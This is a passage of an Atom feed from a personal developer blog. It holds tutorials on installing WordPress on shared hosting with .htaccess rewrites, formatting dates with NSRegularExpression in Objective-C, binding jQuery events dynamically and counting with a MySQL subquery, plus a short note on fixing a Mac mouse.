    <content type="html"><![CDATA[<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>Now we want to setup WordPress manually on shared hosting.</p><h2 id="1-Download-WordPress"><a href="#1-Download-WordPress" class="headerlink" title="1. Download WordPress"></a>1. Download WordPress</h2><p>First of all, <a href="http://wordpress.org/download/">download the WordPress source files</a>. See the screenshot below</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/download-wp.png" alt="Download WordPress"></p><p>Once completed download, unzip it, and you will see all the source files</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/wp-files.png" alt="WordPress source files"></p><h2 id="2-Access-to-your-hosting-server-via-FTP"><a href="#2-Access-to-your-hosting-server-via-FTP" class="headerlink" title="2. Access to your hosting server via FTP"></a>2. Access to your hosting server via FTP</h2><p><a href="http://en.wikipedia.org/wiki/File_Transfer_Protocol">FTP</a> is File Transfer Protocol. Means that you need to upload the souce files<br>to server via FTP.</p><p>You will need a FTP client. You can get a free 1, <a href="https://filezilla-project.org/">FileZilla</a> is one of the most widely use<br>FTP client. But in this tutorial I’m using <a href="http://www.binarynights.com/forklift/">ForkLift</a>.</p><h3 id="i-Login"><a href="#i-Login" class="headerlink" title="i. Login"></a>i. Login</h3><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/ftp-login.png" alt="FTP login"></p><p>You can see the pink box there, <strong>Server</strong> typically is your URL <em>(or more precise is domain name)</em>. You will have this<br><strong>Username</strong> &amp; <strong>Password</strong> after you subscribed the hosting plan. The <strong>Port</strong> just leave it <code>21</code>.</p><h3 id="ii-Copy-wordpress-to-the-hosting-server"><a href="#ii-Copy-wordpress-to-the-hosting-server" class="headerlink" title="ii. Copy wordpress to the hosting server"></a>ii. Copy wordpress to the hosting server</h3><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/copy-wordpress-over.png" alt="Copy wordpress over"></p><p>Make sure is inside <strong>public_html</strong> folder. Then edit the file <strong>.htaccess</strong> <em>(if you don’t have, create it)</em> with the following content.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;IfModule mod_rewrite.c&gt;</span></span><br><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">on</span></span><br><span class="line"><span class="attribute">RewriteCond</span> <span class="variable">%&#123;HTTP_HOST&#125;</span> ^www.jslim89.com</span><br><span class="line"><span class="attribute">RewriteRule</span> ^(.*)$ http://jslim89.com/$<span class="number">1</span><span class="meta"> [R=301,L]</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^$ wordpress/   <span class="meta"> [L]</span></span><br><span class="line"><span class="attribute">RewriteRule</span> (.*) wordpress/$<span class="number">1</span><span class="meta"> [L]</span></span><br><span class="line"><span class="section">&lt;/IfModule&gt;</span></span><br></pre></td></tr></table></figure><p>Remember change it to your domain name <em>(e.g. replace <code>jslim89.com</code> to yourdomain.com)</em>. The line 3 &amp; 4 is when user type in the url<br><a href="http://jslim89.com/">www.jslim89.com</a>, it will redirect to <a href="http://jslim89.com/">jslim89.com</a> <em>(without <code>www</code>)</em></p><p>Now go to your browser, type in your URL…</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/internal-server-error.png" alt="Internal Server Error"></p><p>Oopsss!!! What is this? You’re not setup properly.</p><h2 id="3-Configure-in-cPanel-or-DirectAdmin"><a href="#3-Configure-in-cPanel-or-DirectAdmin" class="headerlink" title="3. Configure in cPanel or DirectAdmin"></a>3. Configure in cPanel or DirectAdmin</h2><p><a href="http://cpanel.net/">cPanel</a> &amp; <a href="http://www.directadmin.com/">DirectAdmin</a> are kind of web control panel for your hosting.</p><p>I’m showing all these in cPanel.</p><h3 id="i-Login-to-cPanel"><a href="#i-Login-to-cPanel" class="headerlink" title="i. Login to cPanel"></a>i. Login to cPanel</h3><p>You will get the login info after you subscribe the hosting plan.</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/cpanel-login.png" alt="cPanel login"></p><h3 id="ii-Create-a-new-database-for-WordPress"><a href="#ii-Create-a-new-database-for-WordPress" class="headerlink" title="ii. Create a new database for WordPress"></a>ii. Create a new database for WordPress</h3><p>First of all, look for this</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/mysql-database.png" alt="MySql database"></p><p>Then create a database <em>(there is a prefix over there, we cannot change it)</em>, make sure its name is unique.</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/create-db.png" alt="Create MySQL database"></p><p>You have to create a database user for this particular database for security purpose, <strong>ONE</strong> user for <strong>ONE</strong> database.</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/create-user.png" alt="Create MySQL user"></p><p>Assign the user for the database you’ve just created.</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/assign-user-to-db.png" alt="Assign user to database"></p><p>At the end you will see this</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/mysqldb-result.png" alt="Database creation complete"></p><h2 id="4-Configure-WordPress"><a href="#4-Configure-WordPress" class="headerlink" title="4. Configure WordPress"></a>4. Configure WordPress</h2><p>Go back to FTP client, look for the file named <strong>wp-config-sample.php</strong> in your <strong>wordpress</strong> folder. Rename the file to <strong>wp-config.php</strong></p><p>Edit the file</p><h3 id="i-Change-database-settings"><a href="#i-Change-database-settings" class="headerlink" title="i. Change database settings"></a>i. Change database settings</h3><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/config-db-settings.png" alt="Database config"></p><p>Change the settings to what you set in cPanel.</p><h3 id="ii-Auth-secret-keys"><a href="#ii-Auth-secret-keys" class="headerlink" title="ii. Auth secret keys"></a>ii. Auth secret keys</h3><p>Go to <a href="https://api.wordpress.org/secret-key/1.1/salt/">https://api.wordpress.org/secret-key/1.1/salt/</a>, you will get a bunch of “dummy text”</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/config-secret-key.png" alt="Replace secret key"></p><p>Replace with the text you get from the URL</p><h3 id="iii-Add-another-htaccess-file"><a href="#iii-Add-another-htaccess-file" class="headerlink" title="iii. Add another .htaccess file"></a>iii. Add another .htaccess file</h3><p>Add another <strong>.htaccess</strong> file with the following content to your wordpress folder.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">RewriteEngine</span> <span class="literal">On</span></span><br><span class="line"><span class="attribute">RewriteBase</span> /</span><br><span class="line"><span class="attribute">RewriteRule</span> ^index\.php$ -<span class="meta"> [L]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add a trailing slash to /wp-admin</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^wp-admin$ wp-admin/<span class="meta"> [R=301,L]</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> -f<span class="meta"> [OR]</span></span><br><span class="line"><span class="attribute">RewriteCond</span> <span class="variable">%&#123;REQUEST_FILENAME&#125;</span> -d</span><br><span class="line"><span class="attribute">RewriteRule</span> ^ -<span class="meta"> [L]</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^(wp-(content|admin|includes).*) $<span class="number">1</span><span class="meta"> [L]</span></span><br><span class="line"><span class="attribute">RewriteRule</span> ^(.*\.php)$ $<span class="number">1</span><span class="meta"> [L]</span></span><br><span class="line"><span class="attribute">RewriteRule</span> . index.php<span class="meta"> [L]</span></span><br></pre></td></tr></table></figure><h2 id="5-Setup-your-site"><a href="#5-Setup-your-site" class="headerlink" title="5. Setup your site"></a>5. Setup your site</h2><p>Now you refresh your browser, you will see a setup page.</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/wp-welcome.png" alt="WordPress setup page"></p><p>The username name is for you to login and post your blog content, so make sure you remember the username &amp; password well.</p><p>Make sure you check <em>Allow search engines to index this site.</em> if you want to have more people reach you.</p><p>Now click on <strong>Install WordPress</strong> button, then login with the username you set just now.</p><h2 id="6-Done"><a href="#6-Done" class="headerlink" title="6. Done"></a>6. Done</h2><p>You will see the admin panel once successful login.</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/wp-admin.png" alt="WordPress admin panel"></p><p>By default, it comes with 1 post <code>Hello World!</code>. So if you want to know what end user see, click on <strong>View site</strong> button on top left corner.</p><p><img src="/images/posts/2014-06-12-setup-wordpress-on-shared-hosting/wp-frontend.png" alt="WordPress frontend"></p><p>You are done, you can start posting your content now.</p><p><em>References:</em></p><ul><li><em><a href="http://codex.wordpress.org/htaccess">WordPress htaccess</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h1&gt;&lt;p&gt;Now we want to setup WordPress</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="wordpress" scheme="http://jslim.net/tags/wordpress/"/>
    
  </entry>
  
  <entry>
    <title>Match &amp;amp; Replace NSString using Regex</title>
    <link href="http://jslim.net/blog/2014/06/11/match-and-replace-nsstring-using-regex/"/>
    <id>http://jslim.net/blog/2014/06/11/match-and-replace-nsstring-using-regex/</id>
    <published>2014-06-11T02:42:18.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>In this example shows, to display current date in a label in a specific format <em>(e.g. 31/12/14 12:59PM)</em></p><p>You can see the <a href="http://unicode.org/reports/tr35/tr35-4.html#Date_Format_Patterns">date format</a></p><p>There is no such a format for 2 characters <strong>year</strong>, so we need to replace through regex.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.</span></span><br><span class="line"><span class="built_in">NSString</span> *dateFormat = <span class="string">@&quot;dd/MM/yyyy hh:mma&quot;</span>;</span><br><span class="line"><span class="built_in">NSString</span> *date = [<span class="built_in">NSDate</span> date];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.</span></span><br><span class="line"><span class="built_in">NSDateFormatter</span> *formatter = [[<span class="built_in">NSDateFormatter</span> alloc] init];</span><br><span class="line">[formatter setDateFormat:dateFormat];</span><br><span class="line"><span class="built_in">NSString</span> *dateStr = [formatter stringFromDate:date];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.</span></span><br><span class="line"><span class="built_in">NSRegularExpression</span> *regex = [<span class="built_in">NSRegularExpression</span> regularExpressionWithPattern:<span class="string">@&quot;(\\d&#123;4&#125;)&quot;</span> options:<span class="built_in">NSRegularExpressionCaseInsensitive</span> error:<span class="literal">nil</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4.</span></span><br><span class="line">[regex enumerateMatchesInString:dateStr options:<span class="number">0</span> range:<span class="built_in">NSMakeRange</span>(<span class="number">0</span>, dateStr.length) usingBlock:^(<span class="built_in">NSTextCheckingResult</span> *result, <span class="built_in">NSMatchingFlags</span> flags, <span class="type">BOOL</span> *stop) &#123;</span><br><span class="line">    <span class="comment">// 5.</span></span><br><span class="line">    <span class="built_in">NSString</span> *year = [dateStr substringWithRange:[result rangeAtIndex:<span class="number">0</span>]];</span><br><span class="line">    <span class="built_in">NSString</span> *newDateFormat = [dateStr stringByReplacingCharactersInRange:[result rangeAtIndex:<span class="number">0</span>] withString:[year substringWithRange:<span class="built_in">NSMakeRange</span>(<span class="number">2</span>, <span class="number">2</span>)]];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6.</span></span><br><span class="line">    dateLabel.text = [<span class="built_in">NSString</span> stringWithFormat:<span class="string">@&quot;My special date %@&quot;</span>, newDateFormat];</span><br><span class="line">&#125;];</span><br></pre></td></tr></table></figure><ol><li>Specify the date format <em>(e.g. the result will be 31/12/2014 12:59PM)</em>, and select current date to display</li><li>Pass the format to the formatter, and store the date as string</li><li>We know that there is only 1 consecutive 4 integers in the string, so we want to extract it. The braces <code>()</code><br>here is to capture the matches text. Double back slash <code>\\</code> here is to escape the back slash <em>(as we know it is<br>special character)</em></li><li>Now we match the whole date string <em>(so we specify the range from index 0 to the string length)</em> from the regex</li><li>We get the matched string now <em>(i.e. <code>2014</code> in this case)</em>, then we replace the characters in the range<br><em>(i.e. <code>(6, 4)</code> which is the index for <code>2014</code>)</em> with the last 2 characters of <code>2014</code></li><li>Finally we set the value to the label</li></ol>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;In this example shows, to display current date in a label in a specific format &lt;em&gt;(e.g. 31/12/14 12:59PM)&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;You can see the</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>jQuery bind event dynamically</title>
    <link href="http://jslim.net/blog/2014/06/09/jquery-bind-event-dynamically/"/>
    <id>http://jslim.net/blog/2014/06/09/jquery-bind-event-dynamically/</id>
    <published>2014-06-09T16:55:23.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Bind event <strong>dynamically</strong> means to bind the event to new DOM element added from jQuery/JavaScript.</p><p>e.g.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;btn-wrapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn-1&quot;</span>&gt;</span>Button 1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn-2&quot;</span>&gt;</span>Button 2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// only take effect on Button 1 &amp; 2</span></span><br><span class="line">    $(<span class="string">&#x27;button&#x27;</span>).<span class="title function_">click</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>($(<span class="variable language_">this</span>).<span class="title function_">text</span>() + <span class="string">&#x27; clicked&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add 2 more buttons</span></span><br><span class="line">    $(<span class="string">&#x27;#btn-wrapper&#x27;</span>).<span class="title function_">append</span>($(<span class="string">&#x27;&lt;button&gt;&#x27;</span>).<span class="title function_">attr</span>(&#123; <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;button&#x27;</span>, <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;btn-3&#x27;</span> &#125;))</span><br><span class="line">        .<span class="title function_">append</span>($(<span class="string">&#x27;&lt;button&gt;&#x27;</span>).<span class="title function_">attr</span>(&#123; <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;button&#x27;</span>, <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;btn-4&#x27;</span> &#125;));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>For jQuery common event like <code>click</code>, we can use <a href="http://api.jquery.com/on/">.on()</a> to bind event dynamically.</p><p>e.g.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// only take effect on all buttons inside #btn-wrapper</span></span><br><span class="line">    $(<span class="string">&#x27;#btn-wrapper&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="string">&#x27;button&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>($(<span class="variable language_">this</span>).<span class="title function_">text</span>() + <span class="string">&#x27; clicked&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h3><p>For certain cases, example like <a href="http://jqueryui.com/sortable/">jQuery UI sortable</a>, we cannot use <code>on</code>.</p><p>After try &amp; error, I get a solution which is external function.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">reloadSortable</span>(<span class="params"></span>) &#123;</span><br><span class="line">        $(<span class="string">&#x27;.list-container&#x27;</span>).<span class="title function_">sortable</span>(&#123;</span><br><span class="line">            <span class="attr">connectWith</span>: <span class="string">&#x27;ul&#x27;</span>,</span><br><span class="line">            <span class="attr">receive</span>: <span class="keyword">function</span>(<span class="params">e, ui</span>) &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&#x27;item received&#x27;</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">remove</span>: <span class="keyword">function</span>(<span class="params">e, ui</span>) &#123;</span><br><span class="line">                <span class="title function_">alert</span>(<span class="string">&#x27;item removed&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add 2 more buttons</span></span><br><span class="line">    $(<span class="string">&#x27;#container-wrapper&#x27;</span>).<span class="title function_">append</span>($(<span class="string">&#x27;&lt;ul&gt;&#x27;</span>).<span class="title function_">attr</span>(&#123; <span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;list-container&#x27;</span> &#125;));</span><br><span class="line">    <span class="title function_">reloadSortable</span>(); <span class="comment">// call this after add new element(s)</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Bind event &lt;strong&gt;dynamically&lt;/strong&gt; means to bind the event to new DOM element added from jQuery/JavaScript.&lt;/p&gt;
&lt;p&gt;e.g.&lt;/p&gt;
&lt;figure</summary>
        
      
    
    
    
    
    <category term="jquery" scheme="http://jslim.net/tags/jquery/"/>
    
  </entry>
  
  <entry>
    <title>MySQL count with subquery</title>
    <link href="http://jslim.net/blog/2014/06/09/mysql-count-with-subquery/"/>
    <id>http://jslim.net/blog/2014/06/09/mysql-count-with-subquery/</id>
    <published>2014-06-09T16:35:30.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>Below shows a forum web app. A <code>post</code> can only post by 1 <code>user</code>, its <code>reply</code> can reply by many <code>users</code></p><h2 id="Tables"><a href="#Tables" class="headerlink" title="Tables:"></a>Tables:</h2><p><strong>post</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> Field             </span>|<span class="string"> Type             </span>|<span class="string"> Null </span>|<span class="string"> Key </span>|<span class="string"> Default </span>|<span class="string"> Extra          </span>|</span><br><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> id                </span>|<span class="string"> int(10) unsigned </span>|<span class="string"> NO   </span>|<span class="string"> PRI </span>|<span class="string"> NULL    </span>|<span class="string"> auto_increment </span>|</span><br><span class="line">|<span class="string"> title             </span>|<span class="string"> varchar(128)     </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> user_id           </span>|<span class="string"> int(10) unsigned </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> 0       </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> published_date    </span>|<span class="string"> datetime         </span>|<span class="string"> YES  </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p><strong>reply</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> Field             </span>|<span class="string"> Type             </span>|<span class="string"> Null </span>|<span class="string"> Key </span>|<span class="string"> Default </span>|<span class="string"> Extra          </span>|</span><br><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> id                </span>|<span class="string"> int(10) unsigned </span>|<span class="string"> NO   </span>|<span class="string"> PRI </span>|<span class="string"> NULL    </span>|<span class="string"> auto_increment </span>|</span><br><span class="line">|<span class="string"> message           </span>|<span class="string"> varchar(128)     </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> post_id           </span>|<span class="string"> int(10) unsigned </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> 0       </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> user_id           </span>|<span class="string"> int(10) unsigned </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> 0       </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> published_date    </span>|<span class="string"> datetime         </span>|<span class="string"> YES  </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><p><strong>user</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> Field             </span>|<span class="string"> Type             </span>|<span class="string"> Null </span>|<span class="string"> Key </span>|<span class="string"> Default </span>|<span class="string"> Extra          </span>|</span><br><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br><span class="line">|<span class="string"> id                </span>|<span class="string"> int(10) unsigned </span>|<span class="string"> NO   </span>|<span class="string"> PRI </span>|<span class="string"> NULL    </span>|<span class="string"> auto_increment </span>|</span><br><span class="line">|<span class="string"> name              </span>|<span class="string"> varchar(128)     </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">|<span class="string"> email             </span>|<span class="string"> varchar(128)     </span>|<span class="string"> NO   </span>|<span class="string">     </span>|<span class="string"> NULL    </span>|<span class="string">                </span>|</span><br><span class="line">+-------------------+------------------+------+-----+---------+----------------+</span><br></pre></td></tr></table></figure><h2 id="Desired-result"><a href="#Desired-result" class="headerlink" title="Desired result"></a>Desired result</h2><p>We want to know all topics <code>total_users</code>, <code>unique_users</code>, i.e.</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="code">+-------------------+</span>------------------<span class="code">+--------------+</span>----------------+</span><br><span class="line"><span class="section">| Topic             | Total Users      | Unique Users | Published Date |</span></span><br><span class="line"><span class="section">+-------------------+------------------+--------------+----------------+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> topic.name <span class="keyword">AS</span> topic_name</span><br><span class="line">    , <span class="built_in">COUNT</span>(reply.user_id) <span class="keyword">AS</span> total_users</span><br><span class="line">    , (<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> user_id) <span class="keyword">FROM</span> reply <span class="keyword">WHERE</span> topic_id <span class="operator">=</span> topic.id) <span class="keyword">AS</span> unique_users</span><br><span class="line">    , topic.published_date</span><br><span class="line"><span class="keyword">FROM</span> topic <span class="keyword">INNER</span> <span class="keyword">JOIN</span> reply <span class="keyword">ON</span> topic.id <span class="operator">=</span> reply.topic_id</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> topic.id</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> unique_users</span><br></pre></td></tr></table></figure><p>See the <em>3rd line</em> of the query, we can select item from inner query and passing the value from outer query to it.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Example&quot;&gt;&lt;a href=&quot;#Example&quot; class=&quot;headerlink&quot; title=&quot;Example&quot;&gt;&lt;/a&gt;Example&lt;/h1&gt;&lt;p&gt;Below shows a forum web app. A &lt;code&gt;post&lt;/code&gt;</summary>
        
      
    
    
    
    
    <category term="mysql" scheme="http://jslim.net/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>OS X Mavericks - left click not working</title>
    <link href="http://jslim.net/blog/2014/06/09/os-x-mavericks-left-click-not-working/"/>
    <id>http://jslim.net/blog/2014/06/09/os-x-mavericks-left-click-not-working/</id>
    <published>2014-06-09T16:27:25.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>I believe most of you have faced such a problem. Left-click &amp; touchpad is not working.</p><p>I googled for an hour, found some possible solution in <a href="https://discussions.apple.com/">Apple Support Communities</a>. But none of them work.</p><p>After few reboots for my Macbook, it still not working. Finally it works after I restarted <em>(turn off and turn on the switch)</em> my bluetooth mouse.</p><p>LOL…</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I believe most of you have faced such a problem. Left-click &amp;amp; touchpad is not working.&lt;/p&gt;
&lt;p&gt;I googled for an hour, found some</summary>
        
      
    
    
    
    
    <category term="mac" scheme="http://jslim.net/tags/mac/"/>
    
  </entry>
  
  <entry>
    <title>iOS - Change QR code color in UIImage</title>
    <link href="http://jslim.net/blog/2014/05/27/ios-change-qr-code-color-in-uiimage/"/>
    <id>http://jslim.net/blog/2014/05/27/ios-change-qr-code-color-in-uiimage/</id>
    <published>2014-05-27T16:52:21.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
